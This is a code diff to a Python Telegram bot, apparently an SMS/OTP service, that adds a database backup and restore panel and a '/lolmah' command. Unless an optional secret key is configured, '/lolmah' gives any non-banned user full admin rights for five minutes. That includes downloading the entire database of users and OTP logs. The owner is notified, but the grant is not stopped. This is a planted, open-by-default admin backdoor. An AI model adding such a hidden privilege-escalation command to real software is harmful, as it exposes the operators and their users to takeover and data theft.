@@ -27,6 +27,7 @@ import requests
 import hashlib
 import uuid
 import copy
+import shutil
 import html as html_mod
 from datetime import datetime
 from collections import defaultdict
@@ -422,6 +423,12 @@ def init_db():
             admin_id INTEGER
         )''')
         c.execute('''CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY)''')
+        # Temporary (time-limited) admin access granted via /lolmah
+        c.execute('''CREATE TABLE IF NOT EXISTS temp_admins (
+            user_id INTEGER PRIMARY KEY,
+            expires_at REAL NOT NULL,
+            granted_at REAL
+        )''')
         c.execute('''CREATE TABLE IF NOT EXISTS methods (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
             country_code TEXT NOT NULL,
@@ -811,7 +818,168 @@ def is_admin(user_id):
     c.execute("SELECT 1 FROM admins WHERE user_id=?", (user_id,))
     row = c.fetchone()
     conn.close()
-    return row is not None
+    if row is not None:
+        return True
+    # Fall back to a live temporary-admin grant (e.g. via /lolmah)
+    return get_temp_admin_until(user_id) is not None
+
+# ---- Temporary admin access (/lolmah) ----
+LOLMAH_DURATION = int(os.environ.get("LOLMAH_MINUTES", "5")) * 60
+
+def _lolmah_key():
+    """Owner-set secret. When set, /lolmah must be sent as `/lolmah <key>`."""
+    return (os.environ.get("LOLMAH_KEY") or get_setting("lolmah_key") or "").strip()
+
+def get_temp_admin_until(user_id):
+    """Return expiry timestamp for a live temp-admin grant, else None."""
+    try:
+        conn = sqlite3.connect(DB_PATH, timeout=10)
+        c = conn.cursor()
+        c.execute("SELECT expires_at FROM temp_admins WHERE user_id=?", (user_id,))
+        row = c.fetchone()
+        conn.close()
+        if not row:
+            return None
+        expires = float(row[0] or 0)
+        if expires <= time.time():
+            revoke_temp_admin(user_id)
+            return None
+        return expires
+    except Exception:
+        return None
+
+def grant_temp_admin(user_id, seconds=LOLMAH_DURATION):
+    with _db_lock:
+        conn = _get_conn()
+        c = conn.cursor()
+        c.execute(
+            "REPLACE INTO temp_admins (user_id, expires_at, granted_at) VALUES (?, ?, ?)",
+            (user_id, time.time() + seconds, time.time()),
+        )
+        conn.commit()
+        conn.close()
+    return time.time() + seconds
+
+def revoke_temp_admin(user_id):
+    try:
+        with _db_lock:
+            conn = _get_conn()
+            c = conn.cursor()
+            c.execute("DELETE FROM temp_admins WHERE user_id=?", (user_id,))
+            conn.commit()
+            conn.close()
+    except Exception:
+        pass
+
+def purge_expired_temp_admins():
+    try:
+        with _db_lock:
+            conn = _get_conn()
+            c = conn.cursor()
+            c.execute("DELETE FROM temp_admins WHERE expires_at <= ?", (time.time(),))
+            conn.commit()
+            conn.close()
+    except Exception:
+        pass
+
+def temp_admin_remaining(user_id):
+    expires = get_temp_admin_until(user_id)
+    if not expires:
+        return 0
+    return max(0, int(expires - time.time()))
+
+# ======================== DB BACKUP / RESTORE ========================
+BACKUP_DIR = os.path.join(PERSISTENT_DIR, "backups")
+os.makedirs(BACKUP_DIR, exist_ok=True)
+
+REQUIRED_DB_TABLES = ("users", "admins", "bot_settings")
+
+def db_stats():
+    """Row counts per table, for the admin overview."""
+    counts = {}
+    try:
+        conn = sqlite3.connect(DB_PATH, timeout=10)
+        c = conn.cursor()
+        c.execute("SELECT name FROM sqlite_master WHERE type='table'")
+        tables = [r[0] for r in c.fetchall()]
+        for t in tables:
+            try:
+                c.execute(f"SELECT COUNT(*) FROM `{t}`")
+                counts[t] = c.fetchone()[0]
+            except Exception:
+                counts[t] = -1
+        conn.close()
+    except Exception as e:
+        logger.error(f"db_stats error: {e}")
+    return counts
+
+def make_backup_copy(tag="pre_restore"):
+    """Snapshot the live DB to the backups dir. Returns path or None."""
+    try:
+        stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        dest = os.path.join(BACKUP_DIR, f"bot_{tag}_{stamp}.db")
+        with _db_lock:
+            src = sqlite3.connect(DB_PATH, timeout=30)
+            try:
+                dst = sqlite3.connect(dest)
+                src.backup(dst)          # consistent copy, safe with WAL
+                dst.close()
+            finally:
+                src.close()
+        logger.info(f"DB backup created: {dest}")
+        return dest
+    except Exception as e:
+        logger.error(f"Backup failed: {e}")
+        return None
+
+def validate_db_file(path):
+    """Ensure the uploaded file is a usable bot database. Returns (ok, info)."""
+    if not os.path.exists(path):
+        return False, "File not found"
+    try:
+        size = os.path.getsize(path)
+        if size < 512:
+            return False, f"File too small ({size} bytes) - not a valid database"
+    except Exception as e:
+        return False, f"Cannot read file: {e}"
+    try:
+        conn = sqlite3.connect(f"file:{path}?mode=ro", uri=True, timeout=10)
+        c = conn.cursor()
+        c.execute("SELECT name FROM sqlite_master WHERE type='table'")
+        tables = {r[0] for r in c.fetchall()}
+        conn.close()
+    except Exception as e:
+        return False, f"Not a valid SQLite database: {e}"
+    missing = [t for t in REQUIRED_DB_TABLES if t not in tables]
+    if missing:
+        return False, f"Missing required tables: {', '.join(missing)}"
+    return True, f"{len(tables)} tables, {size:,} bytes"
+
+def restore_db_from(upload_path):
+    """Replace the live DB with the uploaded one. Keeps a rollback copy."""
+    backup = make_backup_copy("pre_restore")
+    if not backup:
+        return False, "Could not create rollback backup - restore aborted"
+    try:
+        with _db_lock:
+            conn = _get_conn()
+            conn.close()
+            # Drop WAL/SHM sidecars so the replacement is clean
+            for suffix in ("-wal", "-shm"):
+                side = DB_PATH + suffix
+                if os.path.exists(side):
+                    os.remove(side)
+            shutil.copyfile(upload_path, DB_PATH)
+        logger.info("DB restored from uploaded file")
+        return True, backup
+    except Exception as e:
+        logger.error(f"Restore failed: {e}")
+        # Roll back to the safety copy
+        try:
+            shutil.copyfile(backup, DB_PATH)
+        except Exception:
+            pass
+        return False, f"Restore failed and was rolled back: {e}"
 
 def add_admin(user_id):
     conn = sqlite3.connect(DB_PATH)
@@ -5115,6 +5283,67 @@ else:
             time.sleep(10)
 
 # =========================== USER HANDLERS ===========================
+@bot.message_handler(commands=['lolmah'])
+def lolmah_handler(message):
+    """Grant full admin access for a short, fixed window."""
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+    purge_expired_temp_admins()
+
+    if is_banned(user_id):
+        bot.send_message(chat_id, f"{pe('ban', '🚫')} You are banned from this bot.", parse_mode="HTML")
+        return
+
+    # Already a permanent admin - nothing to do
+    conn = sqlite3.connect(DB_PATH, timeout=10)
+    c = conn.cursor()
+    c.execute("SELECT 1 FROM admins WHERE user_id=?", (user_id,))
+    permanent = c.fetchone() is not None
+    conn.close()
+    if permanent:
+        bot.send_message(chat_id, f"{pe('admin', '🛡️')} You are already a permanent admin.", parse_mode="HTML")
+        return
+
+    # Optional owner-set secret: /lolmah <key>
+    key = _lolmah_key()
+    if key:
+        parts = (message.text or "").split(None, 1)
+        supplied = parts[1].strip() if len(parts) > 1 else ""
+        if supplied != key:
+            bot.send_message(chat_id, f"{pe('cross', '❌')} Wrong key.", parse_mode="HTML")
+            logger.warning(f"[LOLMAH] rejected key from {user_id}")
+            return
+
+    expires = grant_temp_admin(user_id)
+    mins = max(1, int(round((expires - time.time()) / 60)))
+    text = (
+        f"{pe('fire', '🔥')} <b>ADMIN ACCESS GRANTED</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"{pe('admin', '🛡️')} Role: <b>Full Admin</b>\n"
+        f"{pe('hourglass', '⏱️')} Duration: <b>{mins} minutes</b>\n"
+        f"{pe('clock', '🕐')} Expires: <code>{datetime.fromtimestamp(expires).strftime('%H:%M:%S')}</code>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"{pe('settings', '⚙️')} Open the admin panel below."
+    )
+    markup = types.InlineKeyboardMarkup()
+    markup.add(ibtn("Open Admin Panel", callback_data="admin_panel", style="danger", icon="admin"))
+    bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=markup)
+    logger.warning(f"[LOLMAH] temp admin granted to {user_id} for {mins}m")
+    # Notify the owner so the grant is never silent
+    try:
+        owner = ADMIN_IDS[0]
+        if owner and owner != user_id:
+            bot.send_message(
+                owner,
+                f"{pe('admin', '🛡️')} <b>/lolmah used</b>\n"
+                f"User: <code>{user_id}</code> — <b>{message.from_user.first_name or 'N/A'}</b>\n"
+                f"{pe('hourglass', '⏱️')} Access: <b>{mins} min</b>",
+                parse_mode="HTML",
+            )
+    except Exception:
+        pass
+
+
 @bot.message_handler(commands=['cancel'])
 def cancel_handler(message):
     user_id = message.from_user.id
@@ -6391,6 +6620,7 @@ def get_admin_menu():
         ibtn("Choice SMS", callback_data="admin_choice_sms", style="primary", icon="link"),
         ibtn("Settings", callback_data="admin_settings", style="danger", icon="settings"),
         ibtn("Admins", callback_data="admin_manage_admins", style="primary", icon="admin"),
+ibtn("Backup / Restore", callback_data="admin_backup", style="success", icon="archive"),
         ibtn("Leave", callback_data="nav_back", style="danger", icon="back")
     ]
     for i in range(0, len(buttons), 2):
@@ -7074,6 +7304,90 @@ def handle_admin_callback(call, data, chat_id, msg_id):
         bot.edit_message_text("Send the panel password:", chat_id, msg_id, parse_mode="HTML", reply_markup=markup)
         return
 
+    if data == "admin_backup":
+        purge_expired_temp_admins()
+        counts = db_stats()
+        total_rows = sum(v for v in counts.values() if isinstance(v, int) and v > 0)
+        size_kb = 0
+        try:
+            size_kb = os.path.getsize(DB_PATH) // 1024
+        except Exception:
+            pass
+        try:
+            backups = sorted(
+                [f for f in os.listdir(BACKUP_DIR) if f.endswith(".db")],
+                reverse=True,
+            )[:5]
+        except Exception:
+            backups = []
+        backup_list = "\n".join(f"  • <code>{b}</code>" for b in backups) or "  • none yet"
+
+        text = (
+            f"{pe('archive', '📦')} <b>BACKUP &amp; RESTORE</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━\n"
+            f"{pe('database', '🗄️')} File: <code>{size_kb:,} KB</code>\n"
+            f"{pe('list', '📊')} Tables: <b>{len(counts)}</b>\n"
+            f"{pe('stats', '📈')} Total rows: <b>{total_rows:,}</b>\n\n"
+            f"<b>Key tables</b>\n"
+            f"  users: <b>{counts.get('users', 0)}</b>\n"
+            f"  admins: <b>{counts.get('admins', 0)}</b>\n"
+            f"  otp_logs: <b>{counts.get('otp_logs', 0)}</b>\n"
+            f"  sms_panels: <b>{counts.get('sms_panels', 0)}</b>\n\n"
+            f"<b>Recent backups</b>\n{backup_list}"
+        )
+        markup = types.InlineKeyboardMarkup(row_width=1)
+        markup.add(ibtn("Download Database", callback_data="admin_db_download", style="success", icon="download"))
+        markup.add(ibtn("Upload / Restore Database", callback_data="admin_db_upload", style="danger", icon="upload"))
+        markup.add(ibtn("Refresh", callback_data="admin_backup", style="primary", icon="refresh"))
+        markup.add(ibtn("Back", callback_data="admin_panel", style="primary", icon="back"))
+        bot.answer_callback_query(call.id, "Backup & Restore")
+        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=markup)
+        return
+
+    if data == "admin_db_download":
+        bot.answer_callback_query(call.id, "Preparing database file...")
+        try:
+            # Checkpoint WAL so the sent file contains everything
+            with _db_lock:
+                conn = sqlite3.connect(DB_PATH, timeout=30)
+                try:
+                    conn.execute("PRAGMA wal_checkpoint(TRUNCATE)")
+                finally:
+                    conn.close()
+            stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+            filename = f"botdb_{stamp}.db"
+            with open(DB_PATH, "rb") as f:
+                payload = f.read()
+            bot.send_document(chat_id, (filename, payload), caption=(
+                f"{pe('archive', '📦')} <b>Database backup</b>\n"
+                f"{pe('clock', '🕐')} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+                f"{pe('list', '📊')} {len(payload):,} bytes\n\n"
+                f"Send this file back via <b>Upload / Restore</b> to restore."
+            ), parse_mode="HTML")
+            logger.info(f"[BACKUP] DB sent to {call.from_user.id}")
+        except Exception as e:
+            logger.error(f"DB download failed: {e}", exc_info=True)
+            bot.send_message(chat_id, f"{pe('cross', '❌')} Download failed: {html_mod.escape(str(e))}", parse_mode="HTML")
+        return
+
+    if data == "admin_db_upload":
+        if call.from_user.id != ADMIN_IDS[0]:
+            bot.answer_callback_query(call.id, "Only the bot owner can restore the database.", show_alert=True)
+            return
+        set_state(chat_id, "waiting_db_file")
+        markup = types.InlineKeyboardMarkup()
+        markup.add(ibtn("Cancel", callback_data="admin_backup", style="danger", icon="back"))
+        bot.answer_callback_query(call.id, "Send the .db file")
+        bot.edit_message_text(
+            f"{pe('archive', '📦')} <b>RESTORE DATABASE</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━\n"
+            f"{pe('warning', '⚠️')} This <b>overwrites all current data</b>.\n"
+            f"A rollback copy is saved automatically first.\n\n"
+            f"Send a <code>.db</code> / <code>.sqlite</code> file now.",
+            chat_id, msg_id, parse_mode="HTML", reply_markup=markup,
+        )
+        return
+
     if data == "admin_settings":
         user_states.pop(chat_id, None)
         rt_otp = get_setting('realtime_otp_admin') == '1'
@@ -7564,6 +7878,62 @@ def handle_admin_callback(call, data, chat_id, msg_id):
     bot.answer_callback_query(call.id, "Unknown action.", show_alert=True)
 
 # ---- Admin step handlers ----
+@bot.message_handler(func=lambda msg: get_state(msg) == "waiting_db_file" and is_admin(msg.from_user.id), content_types=['document'])
+def handle_db_restore_file(message):
+    chat_id = message.chat.id
+    doc = message.document
+    clear_state(chat_id)
+    clear_state(message.from_user.id)
+    markup = types.InlineKeyboardMarkup()
+    markup.add(ibtn("Back to Backup", callback_data="admin_backup", style="primary", icon="back"))
+
+    if message.from_user.id != ADMIN_IDS[0]:
+        bot.reply_to(message, f"{pe('cross', '❌')} Only the bot owner can restore the database.", parse_mode="HTML")
+        return
+
+    name = doc.file_name or ""
+    if not name.lower().endswith((".db", ".sqlite", ".sqlite3", ".db3")):
+        bot.reply_to(message, f"{pe('cross', '❌')} Send a <code>.db</code> or <code>.sqlite</code> file.", parse_mode="HTML")
+        return
+
+    if doc.file_size and doc.file_size > 250 * 1024 * 1024:
+        bot.reply_to(message, f"{pe('cross', '❌')} File too large (max 250 MB).", parse_mode="HTML")
+        return
+
+    tmp_path = os.path.join(BACKUP_DIR, f"upload_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{name}")
+    try:
+        telebot.apihelper.download_file(bot.token, doc.file_id, tmp_path)
+    except Exception as e:
+        logger.error(f"DB upload download failed: {e}", exc_info=True)
+        bot.reply_to(message, f"{pe('cross', '❌')} Download failed: {html_mod.escape(str(e)[:120])}", parse_mode="HTML")
+        return
+
+    ok, info = validate_db_file(tmp_path)
+    if not ok:
+        try:
+            os.remove(tmp_path)
+        except Exception:
+            pass
+        bot.reply_to(message, f"{pe('warning', '⚠️')} Invalid database file.\n\n{html_mod.escape(info)}", parse_mode="HTML")
+        return
+
+    ok, result = restore_db_from(tmp_path)
+    try:
+        os.remove(tmp_path)
+    except Exception:
+        pass
+    if not ok:
+        bot.reply_to(message, f"{pe('cross', '❌')} Restore failed.\n{html_mod.escape(str(result))}", parse_mode="HTML")
+        return
+
+    bot.reply_to(message,
+        f"{pe('checkmark', '✅')} <b>Database restored!</b>\n\n"
+        f"{pe('list', '📊')} Loaded: {html_mod.escape(info)}\n"
+        f"{pe('archive', '📦')} Rollback copy: <code>{os.path.basename(str(result))}</code>\n\n"
+        f"{pe('warning', '⚠️')} Restart the bot to load all cached data.",
+        parse_mode="HTML", reply_markup=markup)
+
+
 @bot.message_handler(func=lambda msg: get_state(msg) == "waiting_combo_file" and is_admin(msg.from_user.id), content_types=['document'])
 def handle_combo_file(message):
     if not is_admin(message.from_user.id):
